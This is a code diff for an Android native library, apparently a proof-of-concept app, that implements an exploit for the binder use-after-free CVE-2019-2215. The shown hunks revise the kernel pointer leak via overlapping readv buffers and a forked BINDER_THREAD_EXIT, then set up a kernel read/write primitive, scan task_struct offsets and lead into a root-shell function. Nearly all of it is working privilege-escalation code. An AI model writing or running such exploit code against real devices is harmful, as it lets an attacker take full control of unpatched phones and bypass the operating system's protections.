@@ -67,17 +67,17 @@ void *mmap_page(unsigned long addr) {
     return mem;
 }
 
-// ========== Step 1: readv で task_struct をリーク ==========
+// ========== Step 1: ダミーデータで readv を起こす ==========
 int leak_task_struct(void) {
     int pipefd[2];
     pid_t cpid;
     struct iovec iovec_stack[IOVEC_COUNT];
     void *aligned_address;
-    struct pollfd pfd;
     ssize_t n;
     uint64_t *data;
+    char dummy[512] = {0};
 
-    LOGI("[*] Leaking task_struct via readv (overlap method)");
+    LOGI("[*] Leaking task_struct via readv with dummy data");
 
     binder_fd = open("/dev/binder", O_RDWR);
     if (binder_fd < 0) {
@@ -127,13 +127,24 @@ int leak_task_struct(void) {
     }
     LOGI("[+] aligned_address=%p", aligned_address);
 
-    // オーバーラップする iovec を設定
+    // オーバーラップ設定
     memset(iovec_stack, 0, sizeof(iovec_stack));
     iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
     iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
     iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
     iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
     LOGI("[+] iovec overlap configured");
+
+    // ダミーデータを書き込む（readv がブロックしないように）
+    if (write(pipefd[1], dummy, sizeof(dummy)) != sizeof(dummy)) {
+        LOGE("Failed to write dummy data");
+        close(binder_fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+    LOGI("[+] Dummy data written to pipe");
 
     cpid = fork();
     if (cpid < 0) {
@@ -146,34 +157,14 @@ int leak_task_struct(void) {
     }
 
     if (cpid == 0) {
-        usleep(100000);  // 100ms 待機
+        usleep(100000);
         LOGI("[child] BINDER_THREAD_EXIT...");
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
         LOGI("[child] BINDER_THREAD_EXIT done");
         _exit(0);
     }
 
-    // poll で pipe にデータが来るのを待つ（5 秒）
-    pfd.fd = pipefd[0];
-    pfd.events = POLLIN;
-    int poll_ret = poll(&pfd, 1, 5000);
-    if (poll_ret < 0) {
-        LOGE("poll failed: %s", strerror(errno));
-        close(binder_fd);
-        close(epoll_fd);
-        close(pipefd[0]);
-        close(pipefd[1]);
-        return -1;
-    }
-    if (poll_ret == 0) {
-        LOGE("poll timeout (no UAF?)");
-        close(binder_fd);
-        close(epoll_fd);
-        close(pipefd[0]);
-        close(pipefd[1]);
-        return -1;
-    }
-
+    // readv を呼び出す（データが既にあるのでブロックしない）
     n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
     LOGI("[parent] readv returned %zd bytes", n);
     if (n < 0) {
@@ -185,14 +176,16 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    // リークしたポインタを探す
+    // リークしたポインタを探す（ダミーデータの後ろから検索）
     data = (uint64_t *)aligned_address;
     for (int i = 0; i < (n / 8); i++) {
         uint64_t val = data[i];
+        // ダミーデータ（0x00 だらけ）をスキップ
+        if (val == 0) continue;
         if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
             task_struct_kptr = val & 0xFFFFFFFFFF000000LL;
             if (task_struct_kptr != 0) {
-                LOGI("[+] Leaked task_struct @ 0x%llx (from offset %d)", (unsigned long long)task_struct_kptr, i);
+                LOGI("[+] Leaked task_struct @ 0x%llx (offset %d)", (unsigned long long)task_struct_kptr, i);
                 break;
             }
         }
@@ -212,7 +205,7 @@ int leak_task_struct(void) {
     return 0;
 }
 
-// ========== Step 2: カーネル読み書きプリミティブ（krw_pipe） ==========
+// ========== Step 2: カーネル読み書きプリミティブ ==========
 int setup_kernel_rw(void) {
     LOGI("[*] Setting up kernel RW...");
 
@@ -280,7 +273,7 @@ int setup_kernel_rw(void) {
     return 0;
 }
 
-// ========== Step 3: task_struct スキャン ==========
+// ========== Step 3: オフセット自動検出 ==========
 int find_offsets(void) {
     LOGI("[*] Finding offsets...");
 
@@ -290,7 +283,7 @@ int find_offsets(void) {
         return -1;
     }
 
-    // リークしたアドレス周辺をスキャン（-0x800 〜 +0x800）
+    // リークしたアドレス周辺をスキャン
     for (int off = -0x800; off <= 0x800; off += 8) {
         uint64_t addr = task_struct_kptr + off;
         if (write(krw_pipe[1], &addr, 8) != 8) continue;
@@ -394,7 +387,7 @@ int spawn_root_shell(void) {
 JNIEXPORT jint JNICALL
 Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass clazz) {
     LOGI("========================================");
-    LOGI("== CVE-2019-2215 readv Exploit ==");
+    LOGI("== CVE-2019-2215 Final Exploit ==");
     LOGI("========================================");
 
     bind_cpu();
